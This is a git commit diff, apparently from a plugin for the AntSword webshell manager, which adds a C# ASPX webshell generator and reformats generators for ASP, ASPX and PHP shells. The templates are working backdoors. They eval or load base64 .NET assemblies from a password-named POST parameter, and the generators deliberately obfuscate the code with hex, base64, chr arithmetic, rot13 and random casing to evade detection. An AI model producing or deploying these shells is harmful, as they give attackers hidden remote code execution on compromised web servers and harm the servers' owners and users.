d386989ab2afbb94b25b5cd1fd2247aab5dfd991
Medicean <Medici.Yan@gmail.com>
2022-06-27 07:56:41 +0800

    support aspxcsharp

--- libs/core.js
+++ libs/core.js
@@ -6,7 +6,7 @@ class Core {
   constructor(argv) {
     let self = this;
     return new Promise((res, rej) => {
-      switch (argv.type){
+      switch (argv.type) {
         case "php":
           res(self._gen_php(argv.pwd));
           break;
@@ -15,6 +15,9 @@ class Core {
           break;
         case "aspx":
           res(self._gen_aspx(argv.pwd));
+          break;
+        case "aspxcsharp":
+          res(self._gen_aspxcsharp(argv.pwd));
           break;
         case "jsp":
           res(self._gen_jsp(argv.pwd));
@@ -32,6 +35,20 @@ class Core {
           break;
       }
     })
+  }
+
+  _gen_aspxcsharp(pwd) {
+    var data = `<%@ Page Language="c#"%>
+<%
+  String PAYLODNAME = Request.Form["${pwd}"];
+  if (PAYLODNAME != null){
+    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(PAYLODNAME));
+    assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(null);
+  }
+%>`;
+    let vars = antSword['utils'].RandomChoice(antSword['RANDOMWORDS'], [], 6);
+    data = data.replace(/PAYLODNAME/g, vars[0].toLowerCase());
+    return data;
   }
 
   _gen_jspjs(pwd) {
@@ -151,7 +168,7 @@ if (cls != null) {
   }
   _gen_asp(pwd) {
     let self = this;
-    let cmd=Buffer.from(self._randomCaseStr(`eval(request("${pwd}"))`)).toString('hex');
+    let cmd = Buffer.from(self._randomCaseStr(`eval(request("${pwd}"))`)).toString('hex');
     let data = `<%<!--"-->
 execute(con("${cmd}"))
 Function con(ByRef strHex):Dim Length:Dim Max:Dim Str:Max = Len(strHex):For Length = 1 To Max Step 2:Str = Str & Chr("&h" & Mid(strHex, Length, 2)):Next:con = Str:End function')
@@ -159,69 +176,69 @@ Function con(ByRef strHex):Dim Length:Dim Max:Dim Str:Max = Len(strHex):For Leng
     return self._randomCaseStr(data);
   }
   _gen_aspx(pwd) {
-    let self = this;
-    let rnd = self._randint(1,1000000);
-    let cmd=Buffer.from(`${rnd};var safe="unsafe";eval(Request.Item['${pwd}'], safe);${rnd*3};`).toString('base64');
-    let sli = [];
-    for(var i=0; i < cmd.length/5 + 1; i++){
-      sli.push(cmd.slice(i*5,i*5+5));
-    }
-    let tmp = [];
-    sli[4].split('').forEach((c,_,arr)=>{
-      tmp.push(self._aspx_encode_char(c,self._randint(1,4)));
-    });
-    sli[4] = `'+${tmp.join("+")}+'`;
-    tmp = [];
-    sli[5].split('').forEach((c,_,arr)=>{
-      tmp.push(self._aspx_encode_char(c,self._randint(1,4)));
-    });
-    sli[5] = `'+${tmp.join("+")}+'`;
-    cmd = sli.join("'+'");
-    let data = `<%@Page Language="Jscript"%>
+      let self = this;
+      let rnd = self._randint(1, 1000000);
+      let cmd = Buffer.from(`${rnd};var safe="unsafe";eval(Request.Item['${pwd}'], safe);${rnd*3};`).toString('base64');
+      let sli = [];
+      for (var i = 0; i < cmd.length / 5 + 1; i++) {
+        sli.push(cmd.slice(i * 5, i * 5 + 5));
+      }
+      let tmp = [];
+      sli[4].split('').forEach((c, _, arr) => {
+        tmp.push(self._aspx_encode_char(c, self._randint(1, 4)));
+      });
+      sli[4] = `'+${tmp.join("+")}+'`;
+      tmp = [];
+      sli[5].split('').forEach((c, _, arr) => {
+        tmp.push(self._aspx_encode_char(c, self._randint(1, 4)));
+      });
+      sli[5] = `'+${tmp.join("+")}+'`;
+      cmd = sli.join("'+'");
+      let data = `<%@Page Language="Jscript"%>
 <%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('${cmd}')));%>
 `;
-    return data;
-  }
-  // 生成 php shell
-  _gen_php(pwd){
+      return data;
+    }
+    // 生成 php shell
+  _gen_php(pwd) {
     let self = this;
-    let rnd = self._randint(1,1000000);
+    let rnd = self._randint(1, 1000000);
     let cmd = Buffer.from(`${rnd};@evAl($_POST[${pwd}]);${rnd*3};`).toString('base64');
     let sli = [];
-    for(var i=0; i < cmd.length/5 + 1; i++){
-      sli.push(cmd.slice(i*5,i*5+5));
+    for (var i = 0; i < cmd.length / 5 + 1; i++) {
+      sli.push(cmd.slice(i * 5, i * 5 + 5));
     }
     let tmp = [];
-    sli[4].split('').forEach((c,_,arr)=>{
-      tmp.push(self._php_encode_char(c,self._randint(1,4)));
+    sli[4].split('').forEach((c, _, arr) => {
+      tmp.push(self._php_encode_char(c, self._randint(1, 4)));
     });
     sli[4] = `'.${tmp.join(".")}.'`;
     tmp = [];
-    sli[5].split('').forEach((c,_,arr)=>{
-      tmp.push(self._php_encode_char(c,self._randint(1,4)));
+    sli[5].split('').forEach((c, _, arr) => {
+      tmp.push(self._php_encode_char(c, self._randint(1, 4)));
     });
     sli[5] = `'.${tmp.join(".")}.'`;
     cmd = sli.join("'.'");
 
     tmp = [];
-    '$some'.split('').forEach((c,_,arr)=>{
-      tmp.push(self._php_encode_char(c,self._randint(1,4)));
+    '$some'.split('').forEach((c, _, arr) => {
+      tmp.push(self._php_encode_char(c, self._randint(1, 4)));
     });
     let para = tmp.join('.');
     tmp = [];
-    'eval($some);'.split('').forEach((c,_,arr)=>{
-      tmp.push(self._php_encode_char(c,self._randint(1,4)));
+    'eval($some);'.split('').forEach((c, _, arr) => {
+      tmp.push(self._php_encode_char(c, self._randint(1, 4)));
     });
     let func = tmp.join('.');
     let func_name = self._randomStr(4);
-    let php_line=`<?php \$${func_name}=create_function(${para},${func});\$${func_name}(base64_decode('${cmd}'));?>`;
+    let php_line = `<?php \$${func_name}=create_function(${para},${func});\$${func_name}(base64_decode('${cmd}'));?>`;
     return php_line;
   }
   _asp_encode_char(c, rnd) {
     let self = this;
     rnd = rnd || 1;
     var n = self._randint(200, 1000);
-    switch(rnd){
+    switch (rnd) {
       case 2:
         return `chr(${n*c.charCodeAt()}/${n})`;
       default:
@@ -229,87 +246,87 @@ Function con(ByRef strHex):Dim Length:Dim Max:Dim Str:Max = Len(strHex):For Leng
     }
   }
   _aspx_encode_char(c, rnd) {
+      let self = this;
+      rnd = rnd || 1;
+      switch (rnd) {
+        case 1:
+          return `System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('${Buffer.from(c).toString('base64')}'))`;
+        case 2:
+          var n = self._randint(200, 1000);
+          switch (n % 3) {
+            case 0:
+              return `char(${n}-${n-(c.charCodeAt())})`;
+            case 1:
+              return `char(0x${n.toString(16)}-0x${(n-c.charCodeAt()).toString(16)})`;
+            case 2:
+              return `char(0${n.toString(8)}-0${(n-c.charCodeAt()).toString(8)})`;
+          }
+          break;
+        case 3:
+          var n = self._randint(200, 1000)
+          switch (n % 3) {
+            case 0:
+              return `char(${n*c.charCodeAt()}/${n})`;
+            case 1:
+              return `char(0x${(n*c.charCodeAt()).toString(16)}/0x${n.toString(16)})`;
+            case 2:
+              return `char(0${(n*c.charCodeAt()).toString(8)}/0${n.toString(8)})`;
+          }
+          break;
+        default:
+          return `'${c}'`;
+      }
+    }
+    /*
+     * php 随机对字符进行转换
+     */
+  _php_encode_char(c, rnd) {
     let self = this;
-    rnd = rnd || 1;
-    switch(rnd) {
+    rnd = rnd || 1
+    switch (rnd) {
+      case 0:
+        return `'${c}'`;
       case 1:
-        return `System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('${Buffer.from(c).toString('base64')}'))`;
+        return `base64_decode('${Buffer.from(c).toString('base64')}')`;
       case 2:
         var n = self._randint(200, 1000);
-        switch(n % 3) {
+        switch (n % 3) {
           case 0:
-            return `char(${n}-${n-(c.charCodeAt())})`;
+            return `chr(${n}-${n-(c.charCodeAt())})`;
           case 1:
-            return `char(0x${n.toString(16)}-0x${(n-c.charCodeAt()).toString(16)})`;
+            return `chr(0x${n.toString(16)}-0x${(n-c.charCodeAt()).toString(16)})`;
           case 2:
-            return `char(0${n.toString(8)}-0${(n-c.charCodeAt()).toString(8)})`;
+            return `chr(0${n.toString(8)}-0${(n-c.charCodeAt()).toString(8)})`;
         }
         break;
       case 3:
-        var n = self._randint(200,1000)
-        switch(n % 3){
+        return `str_rot13('${self._rot13(c)}')`;
+      case 4:
+        var n = self._randint(200, 1000)
+        switch (n % 3) {
           case 0:
-            return `char(${n*c.charCodeAt()}/${n})`;
+            return `chr(${n*c.charCodeAt()}/${n})`;
           case 1:
-            return `char(0x${(n*c.charCodeAt()).toString(16)}/0x${n.toString(16)})`;
+            return `chr(0x${(n*c.charCodeAt()).toString(16)}/0x${n.toString(16)})`;
           case 2:
-            return `char(0${(n*c.charCodeAt()).toString(8)}/0${n.toString(8)})`;
+            return `chr(0${(n*c.charCodeAt()).toString(8)}/0${n.toString(8)})`;
         }
-        break;
-      default:
-        return `'${c}'`;
-    }
-  }
-  /*
-  * php 随机对字符进行转换
-  */
-  _php_encode_char(c, rnd){
-    let self = this;
-    rnd = rnd || 1
-    switch(rnd){
-    case 0:
-      return `'${c}'`;
-    case 1:
-      return `base64_decode('${Buffer.from(c).toString('base64')}')`;
-    case 2:
-      var n = self._randint(200,1000);
-      switch(n%3){
-      case 0:
-        return `chr(${n}-${n-(c.charCodeAt())})`;
-      case 1:
-        return `chr(0x${n.toString(16)}-0x${(n-c.charCodeAt()).toString(16)})`;
-      case 2:
-        return `chr(0${n.toString(8)}-0${(n-c.charCodeAt()).toString(8)})`;
-      }
-      break;
-    case 3:
-      return `str_rot13('${self._rot13(c)}')`;
-    case 4:
-      var n = self._randint(200,1000)
-      switch(n%3){
-        case 0:
-          return `chr(${n*c.charCodeAt()}/${n})`;
-        case 1:
-          return `chr(0x${(n*c.charCodeAt()).toString(16)}/0x${n.toString(16)})`;
-        case 2:
-          return `chr(0${(n*c.charCodeAt()).toString(8)}/0${n.toString(8)})`;
-      }
     }
   }
 
-  _rot13(s){
+  _rot13(s) {
     //use a Regular Expression to Replace only the characters that are a-z or A-Z
-    return s.replace(/[a-zA-Z]/g, function (c) {
-        //Get the character code of the current character and add 13 to it
-        //If it is larger than z's character code then subtract 26 to support wrap around.
-        return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
+    return s.replace(/[a-zA-Z]/g, function(c) {
+      //Get the character code of the current character and add 13 to it
+      //If it is larger than z's character code then subtract 26 to support wrap around.
+      return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
     });
   }
-  _randint(n, m){
-    return Math.floor(Math.random()*(m-n+1)+n);
-  }
-  // 随机产生指定长度字符串
-  _randomStr(len){
+  _randint(n, m) {
+      return Math.floor(Math.random() * (m - n + 1) + n);
+    }
+    // 随机产生指定长度字符串
+  _randomStr(len) {
     len = len || 8;
     let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
     let maxPos = chars.length;
@@ -320,19 +337,19 @@ Function con(ByRef strHex):Dim Length:Dim Max:Dim Str:Max = Len(strHex):For Leng
     return pwd;
   }
   _randomCaseStr(str) {
-    let s = '';
-    for(var i=0; i<str.length; i++) {
-      s += this._randomCaseChr(str[i]);
+      let s = '';
+      for (var i = 0; i < str.length; i++) {
+        s += this._randomCaseChr(str[i]);
+      }
+      return s;
     }
-    return s;
-  }
-  // 随机大小写
+    // 随机大小写
   _randomCaseChr(c) {
-    if(this._randint(0,1)) {
+    if (this._randint(0, 1)) {
       return c.toUpperCase()
     }
     return c.toLowerCase()
   }
 }
-  
+
 module.exports = Core;
--- libs/ui.js
+++ libs/ui.js
@@ -46,17 +46,23 @@ class UI {
   createToolbar() {
     let self = this;
     let toolbar = self.win.win.attachToolbar();
-    toolbar.loadStruct([
-      { type: 'buttonSelect', text: LANG['toolbar']['new'], icon: 'plus-circle', id: 'new', openAll: true,
-      options: [
-        { id: 'asp',  icon: 'file-code-o', type: 'button', text: "ASP"}, // 暂不支持  asp aspx
-        { id: 'aspx', icon: 'file-code-o', type: 'button', text: "ASPX"},
-        { id: 'php',  icon: 'file-code-o', type: 'button', text: "PHP"},
-        { id: 'jsp',  icon: 'file-code-o', type: 'button', text: "JSP"},
-        { id: 'jspx',  icon: 'file-code-o', type: 'button', text: "JSPX"},
-        { id: 'jspjs',  icon: 'file-code-o', type: 'button', text: "JSPJS"},
-        { id: 'jspxjs',  icon: 'file-code-o', type: 'button', text: "JSPXJS"},
-      ]},
+    toolbar.loadStruct([{
+        type: 'buttonSelect',
+        text: LANG['toolbar']['new'],
+        icon: 'plus-circle',
+        id: 'new',
+        openAll: true,
+        options: [
+          { id: 'asp', icon: 'file-code-o', type: 'button', text: "ASP" }, // 暂不支持  asp aspx
+          { id: 'aspx', icon: 'file-code-o', type: 'button', text: "ASPX" },
+          { id: 'aspxcsharp', icon: 'file-code-o', type: 'button', text: "ASPXCSHARP" },
+          { id: 'php', icon: 'file-code-o', type: 'button', text: "PHP" },
+          { id: 'jsp', icon: 'file-code-o', type: 'button', text: "JSP" },
+          { id: 'jspx', icon: 'file-code-o', type: 'button', text: "JSPX" },
+          { id: 'jspjs', icon: 'file-code-o', type: 'button', text: "JSPJS" },
+          { id: 'jspxjs', icon: 'file-code-o', type: 'button', text: "JSPXJS" },
+        ]
+      },
       { id: 'copy', type: 'button', text: LANG['toolbar']['copy'], icon: 'copy' },
       { id: 'refresh', type: 'button', text: LANG['toolbar']['refresh'], icon: 'refresh', disabled: true },
       { id: 'clear', type: 'button', text: LANG['toolbar']['clear'], icon: 'remove' }
@@ -64,7 +70,7 @@ class UI {
     self.toolbar = toolbar;
   }
 
-  createEditor(){
+  createEditor() {
     let self = this;
     self.editor = null;
     // 初始化编辑器
@@ -93,187 +99,188 @@ class UI {
       }
     });
     const inter = setInterval(self.editor.resize.bind(self.editor), 200);
-      self.win.win.attachEvent('onClose', () => {
-        clearInterval(inter);
-        return true;
+    self.win.win.attachEvent('onClose', () => {
+      clearInterval(inter);
+      return true;
     });
   }
 
   /**
-  * 监听按钮点击事件
-  * @param  {Function} callback [description]
-  * @return {[type]}            [description]
-  */
+   * 监听按钮点击事件
+   * @param  {Function} callback [description]
+   * @return {[type]}            [description]
+   */
   bindToolbarClickHandler(callback) {
     let self = this;
     self.toolbar.attachEvent('onClick', (id) => {
-      switch(id){
-      case "asp":
-        layer.prompt({
-          value: "antsword",
-          title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
-        },(value, i, e) => {
-          layer.close(i);
-          if(value === "antsword"){
-            value = self._randomStr(8);
-          }
+      switch (id) {
+        case "asp":
+          layer.prompt({
+            value: "antsword",
+            title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
+          }, (value, i, e) => {
+            layer.close(i);
+            if (value === "antsword") {
+              value = self._randomStr(8);
+            }
+            callback({
+              type: "asp",
+              pwd: value,
+            }).then((data) => {
+              if (data) {
+                self.toolbar.enableItem('refresh');
+                self.config.pwd = value;
+                self.config.type = "asp";
+                self.config.highlight = "ace/mode/asp";
+                self.config.pwdhint = `<!-- ${LANG['pwd_hint']}: ${value} -->`;
+                self.editor.session.setMode(self.config.highlight);
+                self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
+                toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
+              }
+            });
+          });
+          break
+        case "aspx":
+        case "aspxcsharp":
+          layer.prompt({
+            value: "antsword",
+            title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
+          }, (value, i, e) => {
+            layer.close(i);
+            if (value === "antsword") {
+              value = self._randomStr(8);
+            }
+            callback({
+              type: id,
+              pwd: value,
+            }).then((data) => {
+              if (data) {
+                self.toolbar.enableItem('refresh');
+                self.config.pwd = value;
+                self.config.type = id;
+                self.config.highlight = "ace/mode/csharp";
+                self.config.pwdhint = `<%-- // ${LANG['pwd_hint']}: ${value} --%>`;
+                self.editor.session.setMode(self.config.highlight);
+                self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
+                toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
+              }
+            });
+          });
+          break
+        case "php":
+          layer.prompt({
+            value: "antsword",
+            title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
+          }, (value, i, e) => {
+            layer.close(i);
+            if (value === "antsword") {
+              value = self._randomStr(8);
+            }
+            callback({
+              type: "php",
+              pwd: value,
+            }).then((data) => {
+              if (data) {
+                self.toolbar.enableItem('refresh');
+                self.config.pwd = value;
+                self.config.type = "php";
+                self.config.highlight = "ace/mode/php";
+                self.config.pwdhint = `<?php // ${LANG['pwd_hint']}: ${value} ?>`;
+                self.editor.session.setMode(self.config.highlight);
+                self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
+                toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
+              }
+            });
+          });
+          break
+        case "jsp":
+        case "jspjs":
+          layer.prompt({
+            value: "antsword",
+            title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
+          }, (value, i, e) => {
+            layer.close(i);
+            if (value === "antsword") {
+              value = self._randomStr(8);
+            }
+            callback({
+              type: id,
+              pwd: value,
+            }).then((data) => {
+              if (data) {
+                self.toolbar.enableItem('refresh');
+                self.config.pwd = value;
+                self.config.type = id;
+                self.config.highlight = "ace/mode/jsp";
+                self.config.pwdhint = `<%-- ${LANG['pwd_hint']}: ${value} --%>`;
+                self.editor.session.setMode(self.config.highlight);
+                self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
+                toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
+              }
+            });
+          });
+          break
+        case "jspx":
+        case "jspxjs":
+          layer.prompt({
+            value: "antsword",
+            title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
+          }, (value, i, e) => {
+            layer.close(i);
+            if (value === "antsword") {
+              value = self._randomStr(8);
+            }
+            callback({
+              type: id,
+              pwd: value,
+            }).then((data) => {
+              if (data) {
+                self.toolbar.enableItem('refresh');
+                self.config.pwd = value;
+                self.config.type = id;
+                self.config.highlight = "ace/mode/jsp";
+                self.config.pwdhint = `<!-- ${LANG['pwd_hint']}: ${value} -->`;
+                self.editor.session.setMode(self.config.highlight);
+                self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
+                toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
+              }
+            });
+          });
+          break
+        case "refresh":
           callback({
-            type: "asp",
-            pwd: value,
+            type: self.config.type,
+            pwd: self.config.pwd
           }).then((data) => {
-            if(data){
-              self.toolbar.enableItem('refresh');
-              self.config.pwd = value;
-              self.config.type = "asp";
-              self.config.highlight = "ace/mode/asp";
-              self.config.pwdhint = `<!-- ${LANG['pwd_hint']}: ${value} -->`;
+            if (data) {
               self.editor.session.setMode(self.config.highlight);
               self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
               toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
             }
-          });
-        });
-        break
-      case "aspx":
-        layer.prompt({
-          value: "antsword",
-          title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
-        },(value, i, e) => {
-          layer.close(i);
-          if(value === "antsword"){
-            value = self._randomStr(8);
+          })
+          break
+        case "copy":
+          let saveData = self.editor.session.getValue();
+          if (!saveData) {
+            toastr.warning(LANG["message"]["edit_null_value"], LANG_T["warning"]);
+            return
           }
-          callback({
-            type: "aspx",
-            pwd: value,
-          }).then((data) => {
-            if(data){
-              self.toolbar.enableItem('refresh');
-              self.config.pwd = value;
-              self.config.type = "aspx";
-              self.config.highlight = "ace/mode/csharp";
-              self.config.pwdhint = `<%-- // ${LANG['pwd_hint']}: ${value} --%>`;
-              self.editor.session.setMode(self.config.highlight);
-              self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
-              toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
-            }
-          });
-        });
-        break
-      case "php":
-        layer.prompt({
-          value: "antsword",
-          title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
-        },(value, i, e) => {
-          layer.close(i);
-          if(value === "antsword"){
-            value = self._randomStr(8);
+          clipboard.writeText(saveData);
+          // 检测是否复制成功
+          let txt = clipboard.readText();
+          if (txt) {
+            toastr.success(LANG["message"]["copy_success"], LANG_T['success']);
+          } else {
+            toastr.error(LANG["message"]["copy_fail"], LANG_T['error']);
           }
-          callback({
-            type: "php",
-            pwd: value,
-          }).then((data) => {
-            if(data){
-              self.toolbar.enableItem('refresh');
-              self.config.pwd = value;
-              self.config.type = "php";
-              self.config.highlight = "ace/mode/php";
-              self.config.pwdhint = `<?php // ${LANG['pwd_hint']}: ${value} ?>`;
-              self.editor.session.setMode(self.config.highlight);
-              self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
-              toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
-            }
-          });
-        });
-        break
-      case "jsp":
-      case "jspjs":
-        layer.prompt({
-          value: "antsword",
-          title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
-        },(value, i, e) => {
-          layer.close(i);
-          if(value === "antsword"){
-            value = self._randomStr(8);
-          }
-          callback({
-            type: id,
-            pwd: value,
-          }).then((data) => {
-            if(data){
-              self.toolbar.enableItem('refresh');
-              self.config.pwd = value;
-              self.config.type = id;
-              self.config.highlight = "ace/mode/jsp";
-              self.config.pwdhint = `<%-- ${LANG['pwd_hint']}: ${value} --%>`;
-              self.editor.session.setMode(self.config.highlight);
-              self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
-              toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
-            }
-          });
-        });
-        break
-      case "jspx":
-      case "jspxjs":
-        layer.prompt({
-          value: "antsword",
-          title: `<i class="fa fa-file-code-o"></i> ${LANG["prompt"]["create_pwd"]}`
-        },(value, i, e) => {
-          layer.close(i);
-          if(value === "antsword"){
-            value = self._randomStr(8);
-          }
-          callback({
-            type: id,
-            pwd: value,
-          }).then((data) => {
-            if(data){
-              self.toolbar.enableItem('refresh');
-              self.config.pwd = value;
-              self.config.type = id;
-              self.config.highlight = "ace/mode/jsp";
-              self.config.pwdhint = `<!-- ${LANG['pwd_hint']}: ${value} -->`;
-              self.editor.session.setMode(self.config.highlight);
-              self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
-              toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
-            }
-          });
-        });
-        break
-      case "refresh":
-        callback({
-          type: self.config.type,
-          pwd: self.config.pwd
-        }).then((data) => {
-          if (data) {
-            self.editor.session.setMode(self.config.highlight);
-            self.editor.session.setValue(`${self.config.pwdhint}\n${data}`);
-            toastr.success(LANG["message"]["gen_success"], LANG_T['success']);
-          }
-        })
-        break
-      case "copy":
-        let saveData = self.editor.session.getValue();
-        if(!saveData){
-          toastr.warning(LANG["message"]["edit_null_value"], LANG_T["warning"]);
-          return
-        }
-        clipboard.writeText(saveData);
-        // 检测是否复制成功
-        let txt = clipboard.readText();
-        if (txt) {
-          toastr.success(LANG["message"]["copy_success"], LANG_T['success']);
-        }else{
-          toastr.error(LANG["message"]["copy_fail"], LANG_T['error']);
-        }
-        break
-      case "clear":
-        self.editor.session.setValue("");
-        break
+          break
+        case "clear":
+          self.editor.session.setValue("");
+          break
       }
     });
   }
-  _randomStr(len){
+  _randomStr(len) {
     len = len || 8;
     let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
     let maxPos = chars.length;
